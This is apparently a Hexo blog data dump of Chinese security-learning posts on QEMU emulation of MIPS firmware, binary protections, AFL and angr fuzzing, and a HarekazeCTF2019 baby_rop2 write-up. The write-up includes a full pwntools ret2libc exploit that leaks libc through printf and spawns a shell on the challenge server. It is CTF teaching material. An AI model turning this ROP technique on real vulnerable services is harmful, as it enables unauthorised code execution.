<path-to-elf>\n```\n\n对于32位小端序（LSB）程序，使用`qemu-mipsel`来仿真，32位MSB程序，使用`qemu-mips`来仿真\n\n一个小端序的仿真示例：\n\n![](/img/qemu/1.jpg)\n\n> Q1：为什么要加 -static ？\n>\n> A1：xxx-static表示使用静态链接的qemu程序，不依赖外部动态链接程序，由于使用是要chroot改变根目录，原本的动态链接库会无法找到，除非使用ldd命令把所有依赖全都复制到新的根目录下，否则无法运行。\n>\n> 而且真的复制动态链接库过来可能会和原本存在的文件重名（我猜的，没验证过😅）\n\n##### 系统模式\n\n不管了，直接用fap（\n\n见上一篇文章 <https://isolator-1.github.io/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/>","source":"_posts/固件仿真/如何用qemu仿真mips程序.md","raw":"---\ntitle: qemu的安装与仿真第一个mips程序\ntags: [firmware analysis]\ndate: 2022-12-23 15:33:00\ncategories: [固件仿真]\nexcerpt: qemu的user-mode使用方法\n---\n\n#### QEMU安装\n\nQEMU仿真程序分为两类：使用者模式（User Mode）、系统模式（System Mode）。区别在于User Mode只仿真单个程序，而System Mode仿真整个计算机系统，类似vmware\n\n##### 使用者模式\n\n安装：`sudo apt-get install qemu-user[-static]`\n\n使用（以mips为例）：\n\n\n```shell\ncd <path-to-fsroot>\ncp $(which qemu-mipsel-static) ./\nsudo chroot . ./qemu-mipsel-static <path-to-elf>\n```\n\n对于32位小端序（LSB）程序，使用`qemu-mipsel`来仿真，32位MSB程序，使用`qemu-mips`来仿真\n\n一个小端序的仿真示例：\n\n![](/img/qemu/1.jpg)\n\n> Q1：为什么要加 -static ？\n>\n> A1：xxx-static表示使用静态链接的qemu程序，不依赖外部动态链接程序，由于使用是要chroot改变根目录，原本的动态链接库会无法找到，除非使用ldd命令把所有依赖全都复制到新的根目录下，否则无法运行。\n>\n> 而且真的复制动态链接库过来可能会和原本存在的文件重名（我猜的，没验证过😅）\n\n##### 系统模式\n\n不管了，直接用fap（\n\n见上一篇文章 <https://isolator-1.github.io/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/>","slug":"固件仿真/如何用qemu仿真mips程序","published":1,"updated":"2023-01-03T05:43:32.197Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clf7vmazp0002isuff0ov4j50","content":"<h4 id=\"QEMU安装\"><a href=\"#QEMU安装\" class=\"headerlink\" title=\"QEMU安装\"></a>QEMU安装</h4><p>QEMU仿真程序分为两类：使用者模式（User Mode）、系统模式（System Mode）。区别在于User Mode只仿真单个程序，而System Mode仿真整个计算机系统，类似vmware</p>\n<h5 id=\"使用者模式\"><a href=\"#使用者模式\" class=\"headerlink\" title=\"使用者模式\"></a>使用者模式</h5><p>安装：<code>sudo apt-get install qemu-user[-static]</code></p>\n<p>使用（以mips为例）：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">cd &lt;path-to-fsroot&gt;<br>cp $(which qemu-mipsel-static) ./<br>sudo chroot . ./qemu-mipsel-static &lt;path-to-elf&gt;<br></code></pre></td></tr></table></figure>\n\n<p>对于32位小端序（LSB）程序，使用<code>qemu-mipsel</code>来仿真，32位MSB程序，使用<code>qemu-mips</code>来仿真</p>\n<p>一个小端序的仿真示例：</p>\n<p><img src=\"/img/qemu/1.jpg\"></p>\n<blockquote>\n<p>Q1：为什么要加 -static ？</p>\n<p>A1：xxx-static表示使用静态链接的qemu程序，不依赖外部动态链接程序，由于使用是要chroot改变根目录，原本的动态链接库会无法找到，除非使用ldd命令把所有依赖全都复制到新的根目录下，否则无法运行。</p>\n<p>而且真的复制动态链接库过来可能会和原本存在的文件重名（我猜的，没验证过😅）</p>\n</blockquote>\n<h5 id=\"系统模式\"><a href=\"#系统模式\" class=\"headerlink\" title=\"系统模式\"></a>系统模式</h5><p>不管了，直接用fap（</p>\n<p>见上一篇文章 <a href=\"https://isolator-1.github.io/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/\">https://isolator-1.github.io/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/</a></p>\n","site":{"data":{}},"more":"<h4 id=\"QEMU安装\"><a href=\"#QEMU安装\" class=\"headerlink\" title=\"QEMU安装\"></a>QEMU安装</h4><p>QEMU仿真程序分为两类：使用者模式（User Mode）、系统模式（System Mode）。区别在于User Mode只仿真单个程序，而System Mode仿真整个计算机系统，类似vmware</p>\n<h5 id=\"使用者模式\"><a href=\"#使用者模式\" class=\"headerlink\" title=\"使用者模式\"></a>使用者模式</h5><p>安装：<code>sudo apt-get install qemu-user[-static]</code></p>\n<p>使用（以mips为例）：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">cd &lt;path-to-fsroot&gt;<br>cp $(which qemu-mipsel-static) ./<br>sudo chroot . ./qemu-mipsel-static &lt;path-to-elf&gt;<br></code></pre></td></tr></table></figure>\n\n<p>对于32位小端序（LSB）程序，使用<code>qemu-mipsel</code>来仿真，32位MSB程序，使用<code>qemu-mips</code>来仿真</p>\n<p>一个小端序的仿真示例：</p>\n<p><img src=\"/img/qemu/1.jpg\"></p>\n<blockquote>\n<p>Q1：为什么要加 -static ？</p>\n<p>A1：xxx-static表示使用静态链接的qemu程序，不依赖外部动态链接程序，由于使用是要chroot改变根目录，原本的动态链接库会无法找到，除非使用ldd命令把所有依赖全都复制到新的根目录下，否则无法运行。</p>\n<p>而且真的复制动态链接库过来可能会和原本存在的文件重名（我猜的，没验证过😅）</p>\n</blockquote>\n<h5 id=\"系统模式\"><a href=\"#系统模式\" class=\"headerlink\" title=\"系统模式\"></a>系统模式</h5><p>不管了，直接用fap（</p>\n<p>见上一篇文章 <a href=\"https://isolator-1.github.io/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/\">https://isolator-1.github.io/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/</a></p>\n"},{"title":"程序保护机制","date":"2023-03-14T09:04:00.000Z","excerpt":"保护机制","_content":"\n## NX\n\n栈不可执行 no execute\n\n同DEP，数据执行保护。\n\n\n\n## Stack Canary\n\n栈中加一个随机数，在函数执行完返回之前，检查这个随机数是否改变来判断是否栈溢出\n\n\n\n## PIE与ASLR\n\nASLR随机堆、栈、mmap的地址\n\nPIE随机数据段、代码段的地址\n\n\n\n## Relro\n\nrelocation read-only 重定向只读\n\n开启之后got表不可写\n\n","source":"_posts/ctf-pwn/保护机制.md","raw":"---\ntitle: 程序保护机制\ntags: [ctf-pwn]\ndate: 2023-3-14 17:04:00\ncategories: [ctf-pwn]\nexcerpt: 保护机制\n---\n\n## NX\n\n栈不可执行 no execute\n\n同DEP，数据执行保护。\n\n\n\n## Stack Canary\n\n栈中加一个随机数，在函数执行完返回之前，检查这个随机数是否改变来判断是否栈溢出\n\n\n\n## PIE与ASLR\n\nASLR随机堆、栈、mmap的地址\n\nPIE随机数据段、代码段的地址\n\n\n\n## Relro\n\nrelocation read-only 重定向只读\n\n开启之后got表不可写\n\n","slug":"ctf-pwn/保护机制","published":1,"updated":"2023-03-14T09:08:34.257Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clf817ky00000nwuf9bn0ezlf","content":"<h2 id=\"NX\"><a href=\"#NX\" class=\"headerlink\" title=\"NX\"></a>NX</h2><p>栈不可执行 no execute</p>\n<p>同DEP，数据执行保护。</p>\n<h2 id=\"Stack-Canary\"><a href=\"#Stack-Canary\" class=\"headerlink\" title=\"Stack Canary\"></a>Stack Canary</h2><p>栈中加一个随机数，在函数执行完返回之前，检查这个随机数是否改变来判断是否栈溢出</p>\n<h2 id=\"PIE与ASLR\"><a href=\"#PIE与ASLR\" class=\"headerlink\" title=\"PIE与ASLR\"></a>PIE与ASLR</h2><p>ASLR随机堆、栈、mmap的地址</p>\n<p>PIE随机数据段、代码段的地址</p>\n<h2 id=\"Relro\"><a href=\"#Relro\" class=\"headerlink\" title=\"Relro\"></a>Relro</h2><p>relocation read-only 重定向只读</p>\n<p>开启之后got表不可写</p>\n","site":{"data":{}},"more":"<h2 id=\"NX\"><a href=\"#NX\" class=\"headerlink\" title=\"NX\"></a>NX</h2><p>栈不可执行 no execute</p>\n<p>同DEP，数据执行保护。</p>\n<h2 id=\"Stack-Canary\"><a href=\"#Stack-Canary\" class=\"headerlink\" title=\"Stack Canary\"></a>Stack Canary</h2><p>栈中加一个随机数，在函数执行完返回之前，检查这个随机数是否改变来判断是否栈溢出</p>\n<h2 id=\"PIE与ASLR\"><a href=\"#PIE与ASLR\" class=\"headerlink\" title=\"PIE与ASLR\"></a>PIE与ASLR</h2><p>ASLR随机堆、栈、mmap的地址</p>\n<p>PIE随机数据段、代码段的地址</p>\n<h2 id=\"Relro\"><a href=\"#Relro\" class=\"headerlink\" title=\"Relro\"></a>Relro</h2><p>relocation read-only 重定向只读</p>\n<p>开启之后got表不可写</p>\n"},{"title":"HarekazeCTF2019 baby_rop2","date":"2023-04-21T03:24:00.000Z","excerpt":"exp","_content":"\n**题目**\n\n<https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2>\n\n和前面一个题目同样，是一个构造rop链的栈溢出，虽然题目也给了libc文件，但是不是必要的\n\n前一个文章地址：https://isolator-1.github.io/2022/11/16/ctf-pwn/ROP%20ciscn_2019_c_1/\n\n**方法**\n\n这道题目的差别或值得注意的地方在于\n\n1. 不再是用puts函数（只需要一个参数），这道题目中可以用printf构造rop链\n\n   printf有两个参数，除了rdi寄存器之外，还需要rsi寄存器来传递参数，但是这个程序里没有直接的`pop rsi, ret`的代码，只有一个`pop rsi, pop r15, ret`，因此需要再额外给r15在栈上留出一个空间。详见exp代码。\n\n2. 用read函数进行libc基地址泄露，虽然理论上用printf也可以，但是我不知道为什么没有成功，我在网上查的时候别人也有这个问题\n\n**Exp**\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\n#p = process('./babyrop2')\np = remote(\"node4.buuoj.cn\",29507)\n\nelf = ELF('./babyrop2')\n\npoprdi_ret = 0x400733\npoprsi_popr15_ret = 0x400731\nmain = elf.sym['main']\nprintf_plt = elf.plt['printf']\nprintf_got = elf.got['printf']\n\nread_plt = elf.plt['read']\nread_got = elf.got['read']\n\nformat_str = 0x400790\n\npayload = b'a'*40 + p64(poprdi_ret) + p64(format_str) + \\\n          p64(poprsi_popr15_ret) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main)\n\np.sendlineafter(\"What's your name? \",payload)\n\nread_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\nprint('read_addr:' + hex(read_addr))\n\nlibc = LibcSearcher('read', read_addr)\noffset = read_addr - libc.dump('read')\nbinsh = offset + libc.dump('str_bin_sh')\nsystem = offset + libc.dump('system')\n\npayload = b'a'*40 + p64(poprdi_ret) + p64(binsh) + p64(system)\n\np.sendlineafter(\"What's your name? \", payload)\np.interactive()\n```\n\n","source":"_posts/ctf-pwn/[HarekazeCTF2019]baby_rop2.md","raw":"---\ntitle: HarekazeCTF2019 baby_rop2\ntags: [ctf-pwn,exp]\ndate: 2023-4-21 11:24\ncategories: [ctf-pwn]\nexcerpt: exp\n---\n\n**题目**\n\n<https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2>\n\n和前面一个题目同样，是一个构造rop链的栈溢出，虽然题目也给了libc文件，但是不是必要的\n\n前一个文章地址：https://isolator-1.github.io/2022/11/16/ctf-pwn/ROP%20ciscn_2019_c_1/\n\n**方法**\n\n这道题目的差别或值得注意的地方在于\n\n1. 不再是用puts函数（只需要一个参数），这道题目中可以用printf构造rop链\n\n   printf有两个参数，除了rdi寄存器之外，还需要rsi寄存器来传递参数，但是这个程序里没有直接的`pop rsi, ret`的代码，只有一个`pop rsi, pop r15, ret`，因此需要再额外给r15在栈上留出一个空间。详见exp代码。\n\n2. 用read函数进行libc基地址泄露，虽然理论上用printf也可以，但是我不知道为什么没有成功，我在网上查的时候别人也有这个问题\n\n**Exp**\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\n#p = process('./babyrop2')\np = remote(\"node4.buuoj.cn\",29507)\n\nelf = ELF('./babyrop2')\n\npoprdi_ret = 0x400733\npoprsi_popr15_ret = 0x400731\nmain = elf.sym['main']\nprintf_plt = elf.plt['printf']\nprintf_got = elf.got['printf']\n\nread_plt = elf.plt['read']\nread_got = elf.got['read']\n\nformat_str = 0x400790\n\npayload = b'a'*40 + p64(poprdi_ret) + p64(format_str) + \\\n          p64(poprsi_popr15_ret) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main)\n\np.sendlineafter(\"What's your name? \",payload)\n\nread_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\nprint('read_addr:' + hex(read_addr))\n\nlibc = LibcSearcher('read', read_addr)\noffset = read_addr - libc.dump('read')\nbinsh = offset + libc.dump('str_bin_sh')\nsystem = offset + libc.dump('system')\n\npayload = b'a'*40 + p64(poprdi_ret) + p64(binsh) + p64(system)\n\np.sendlineafter(\"What's your name? \", payload)\np.interactive()\n```\n\n","slug":"ctf-pwn/[HarekazeCTF2019]baby_rop2","published":1,"updated":"2023-04-21T03:42:18.666Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgq0i4r20000r8uf7v8ihsj9","content":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2\">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2</a></p>\n<p>和前面一个题目同样，是一个构造rop链的栈溢出，虽然题目也给了libc文件，但是不是必要的</p>\n<p>前一个文章地址：<a href=\"https://isolator-1.github.io/2022/11/16/ctf-pwn/ROP%20ciscn_2019_c_1/\">https://isolator-1.github.io/2022/11/16/ctf-pwn/ROP%20ciscn_2019_c_1/</a></p>\n<p><strong>方法</strong></p>\n<p>这道题目的差别或值得注意的地方在于</p>\n<ol>\n<li><p>不再是用puts函数（只需要一个参数），这道题目中可以用printf构造rop链</p>\n<p>printf有两个参数，除了rdi寄存器之外，还需要rsi寄存器来传递参数，但是这个程序里没有直接的<code>pop rsi, ret</code>的代码，只有一个<code>pop rsi, pop r15, ret</code>，因此需要再额外给r15在栈上留出一个空间。详见exp代码。</p>\n</li>\n<li><p>用read函数进行libc基地址泄露，虽然理论上用printf也可以，但是我不知道为什么没有成功，我在网上查的时候别人也有这个问题</p>\n</li>\n</ol>\n<p><strong>Exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br><br><span class=\"hljs-comment\">#p = process(&#x27;./babyrop2&#x27;)</span><br>p = remote(<span class=\"hljs-string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"hljs-number\">29507</span>)<br><br>elf = ELF(<span class=\"hljs-string\">&#x27;./babyrop2&#x27;</span>)<br><br>poprdi_ret = <span class=\"hljs-number\">0x400733</span><br>poprsi_popr15_ret = <span class=\"hljs-number\">0x400731</span><br>main = elf.sym[<span class=\"hljs-string\">&#x27;main&#x27;</span>]<br>printf_plt = elf.plt[<span class=\"hljs-string\">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class=\"hljs-string\">&#x27;printf&#x27;</span>]<br><br>read_plt = elf.plt[<span class=\"hljs-string\">&#x27;read&#x27;</span>]<br>read_got = elf.got[<span class=\"hljs-string\">&#x27;read&#x27;</span>]<br><br>format_str = <span class=\"hljs-number\">0x400790</span><br><br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span>*<span class=\"hljs-number\">40</span> + p64(poprdi_ret) + p64(format_str) + \\<br>          p64(poprsi_popr15_ret) + p64(read_got) + p64(<span class=\"hljs-number\">0</span>) + p64(printf_plt) + p64(main)<br><br>p.sendlineafter(<span class=\"hljs-string\">&quot;What&#x27;s your name? &quot;</span>,payload)<br><br>read_addr = u64(p.recvuntil(<span class=\"hljs-string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"hljs-number\">6</span>:].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\x00&#x27;</span>))<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;read_addr:&#x27;</span> + <span class=\"hljs-built_in\">hex</span>(read_addr))<br><br>libc = LibcSearcher(<span class=\"hljs-string\">&#x27;read&#x27;</span>, read_addr)<br>offset = read_addr - libc.dump(<span class=\"hljs-string\">&#x27;read&#x27;</span>)<br>binsh = offset + libc.dump(<span class=\"hljs-string\">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>)<br><br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span>*<span class=\"hljs-number\">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendlineafter(<span class=\"hljs-string\">&quot;What&#x27;s your name? &quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"more":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2\">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2</a></p>\n<p>和前面一个题目同样，是一个构造rop链的栈溢出，虽然题目也给了libc文件，但是不是必要的</p>\n<p>前一个文章地址：<a href=\"https://isolator-1.github.io/2022/11/16/ctf-pwn/ROP%20ciscn_2019_c_1/\">https://isolator-1.github.io/2022/11/16/ctf-pwn/ROP%20ciscn_2019_c_1/</a></p>\n<p><strong>方法</strong></p>\n<p>这道题目的差别或值得注意的地方在于</p>\n<ol>\n<li><p>不再是用puts函数（只需要一个参数），这道题目中可以用printf构造rop链</p>\n<p>printf有两个参数，除了rdi寄存器之外，还需要rsi寄存器来传递参数，但是这个程序里没有直接的<code>pop rsi, ret</code>的代码，只有一个<code>pop rsi, pop r15, ret</code>，因此需要再额外给r15在栈上留出一个空间。详见exp代码。</p>\n</li>\n<li><p>用read函数进行libc基地址泄露，虽然理论上用printf也可以，但是我不知道为什么没有成功，我在网上查的时候别人也有这个问题</p>\n</li>\n</ol>\n<p><strong>Exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br><br><span class=\"hljs-comment\">#p = process(&#x27;./babyrop2&#x27;)</span><br>p = remote(<span class=\"hljs-string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"hljs-number\">29507</span>)<br><br>elf = ELF(<span class=\"hljs-string\">&#x27;./babyrop2&#x27;</span>)<br><br>poprdi_ret = <span class=\"hljs-number\">0x400733</span><br>poprsi_popr15_ret = <span class=\"hljs-number\">0x400731</span><br>main = elf.sym[<span class=\"hljs-string\">&#x27;main&#x27;</span>]<br>printf_plt = elf.plt[<span class=\"hljs-string\">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class=\"hljs-string\">&#x27;printf&#x27;</span>]<br><br>read_plt = elf.plt[<span class=\"hljs-string\">&#x27;read&#x27;</span>]<br>read_got = elf.got[<span class=\"hljs-string\">&#x27;read&#x27;</span>]<br><br>format_str = <span class=\"hljs-number\">0x400790</span><br><br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span>*<span class=\"hljs-number\">40</span> + p64(poprdi_ret) + p64(format_str) + \\<br>          p64(poprsi_popr15_ret) + p64(read_got) + p64(<span class=\"hljs-number\">0</span>) + p64(printf_plt) + p64(main)<br><br>p.sendlineafter(<span class=\"hljs-string\">&quot;What&#x27;s your name? &quot;</span>,payload)<br><br>read_addr = u64(p.recvuntil(<span class=\"hljs-string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"hljs-number\">6</span>:].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\x00&#x27;</span>))<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;read_addr:&#x27;</span> + <span class=\"hljs-built_in\">hex</span>(read_addr))<br><br>libc = LibcSearcher(<span class=\"hljs-string\">&#x27;read&#x27;</span>, read_addr)<br>offset = read_addr - libc.dump(<span class=\"hljs-string\">&#x27;read&#x27;</span>)<br>binsh = offset + libc.dump(<span class=\"hljs-string\">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>)<br><br>payload = <span class=\"hljs-string\">b&#x27;a&#x27;</span>*<span class=\"hljs-number\">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendlineafter(<span class=\"hljs-string\">&quot;What&#x27;s your name? &quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n"},{"title":"FUZZ-AFL","date":"2023-03-15T14:54:00.000Z","excerpt":"模糊测试的学习","_content":"\n### AFL\n\n安装afl\n\n```shell\nsudo apt-get install afl\n```\n\n写一个在特定输入会崩溃的程序 `c1.cpp`\n\n```C++\n#include <iostream>\n#include <string.h>\nusing namespace std;\nint main()\n{\n\tchar ptr[20];\n\tcin>>ptr;\n\tif(strcmp(ptr,\"deadbeef\")==0){\n\t\tabort();\n\t}\n\treturn 0;\n\n}\n```\n\n使用afl-g++编译，这样编译出来的程序会被插桩\n\n```shell\nafl-g++ -g c1.cpp -o c1.out\n```\n\n创建一个`input_folder`，这里`input_folder`里先随便放一个文本文件`abc`，里面写入`hello`。\n\n再创建一个`output_folder`，什么都不用放进去\n\n开始对得到的程序进行fuzz\n\n```shell\nafl-fuzz -i ./input_folder -o ./output_folder c1.out\n```\n\n> 因为afl在进行模糊测试的时候是将这个`input_folder`里的文件作为输入，然后对给定的输入使用遗传算法不断进行变化，将变化出来的结果继续输入给程序，因此，虽然随便输入什么都是可以的，但是输入的内容与程序崩溃的输入越接近，则afl得到结果的速度越快。\n\n\n\n### angr\n\n安装angr：直接用docker，dockerhub上有angr的镜像\n\n```shell\nsudo docker pull angr/angr\nsudo docker run (--net host) -it angr/angr bash\n```\n\nangr的简单例子\n\n```python\n>>> import angr\n>>> proj = angr.Project('/bin/true') # /bin/true是linux的一个永远return 0的程序\n>>> import monkeyhex # 将输出转为16进制，但是docker里并不自带，要pip install一下\n>>> proj.arch\n<Arch AMD64 (LE)>\n>>> proj.entry\n0x401670\n>>> proj.filename\n'/bin/true'\n```\n\n\n\n","source":"_posts/fuzz/fuzz.md","raw":"---\ntitle: FUZZ-AFL\ntags: [fuzz,afl]\ndate: 2023-03-15 22:54:00\ncategories: [fuzz]\nexcerpt: 模糊测试的学习\n---\n\n### AFL\n\n安装afl\n\n```shell\nsudo apt-get install afl\n```\n\n写一个在特定输入会崩溃的程序 `c1.cpp`\n\n```C++\n#include <iostream>\n#include <string.h>\nusing namespace std;\nint main()\n{\n\tchar ptr[20];\n\tcin>>ptr;\n\tif(strcmp(ptr,\"deadbeef\")==0){\n\t\tabort();\n\t}\n\treturn 0;\n\n}\n```\n\n使用afl-g++编译，这样编译出来的程序会被插桩\n\n```shell\nafl-g++ -g c1.cpp -o c1.out\n```\n\n创建一个`input_folder`，这里`input_folder`里先随便放一个文本文件`abc`，里面写入`hello`。\n\n再创建一个`output_folder`，什么都不用放进去\n\n开始对得到的程序进行fuzz\n\n```shell\nafl-fuzz -i ./input_folder -o ./output_folder c1.out\n```\n\n> 因为afl在进行模糊测试的时候是将这个`input_folder`里的文件作为输入，然后对给定的输入使用遗传算法不断进行变化，将变化出来的结果继续输入给程序，因此，虽然随便输入什么都是可以的，但是输入的内容与程序崩溃的输入越接近，则afl得到结果的速度越快。\n\n\n\n### angr\n\n安装angr：直接用docker，dockerhub上有angr的镜像\n\n```shell\nsudo docker pull angr/angr\nsudo docker run (--net host) -it angr/angr bash\n```\n\nangr的简单例子\n\n```python\n>>> import angr\n>>> proj = angr.Project('/bin/true') # /bin/true是linux的一个永远return 0的程序\n>>> import monkeyhex # 将输出转为16进制，但是docker里并不自带，要pip install一下\n>>> proj.arch\n<Arch AMD64 (LE)>\n>>> proj.entry\n0x401670\n>>> proj.filename\n'/bin/true'\n```\n\n\n\n","slug":"fuzz/fuzz","published":1,"updated":"2023-03-20T04:49:30.801Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgq0i4r80002r8ufba590arf","content":"<h3 id=\"AFL\"><a href=\"#AFL\" class=\"headerlink\" title=\"AFL\"></a>AFL</h3><p>安装afl</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo apt-get install afl<br></code></pre></td></tr></table></figure>\n\n<p>写一个在特定输入会崩溃的程序 <code>c1.cpp</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C++\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;iostream&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span><br><span class=\"hljs-keyword\">using</span> <span class=\"hljs-keyword\">namespace</span> std;<br><span class=\"hljs-function\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">()</span></span><br><span class=\"hljs-function\"></span>&#123;<br>\t<span class=\"hljs-type\">char</span> ptr[<span class=\"hljs-number\">20</span>];<br>\tcin&gt;&gt;ptr;<br>\t<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-built_in\">strcmp</span>(ptr,<span class=\"hljs-string\">&quot;deadbeef&quot;</span>)==<span class=\"hljs-number\">0</span>)&#123;<br>\t\t<span class=\"hljs-built_in\">abort</span>();<br>\t&#125;<br>\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>使用afl-g++编译，这样编译出来的程序会被插桩</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">afl-g++ -g c1.cpp -o c1.out<br></code></pre></td></tr></table></figure>\n\n<p>创建一个<code>input_folder</code>，这里<code>input_folder</code>里先随便放一个文本文件<code>abc</code>，里面写入<code>hello</code>。</p>\n<p>再创建一个<code>output_folder</code>，什么都不用放进去</p>\n<p>开始对得到的程序进行fuzz</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">afl-fuzz -i ./input_folder -o ./output_folder 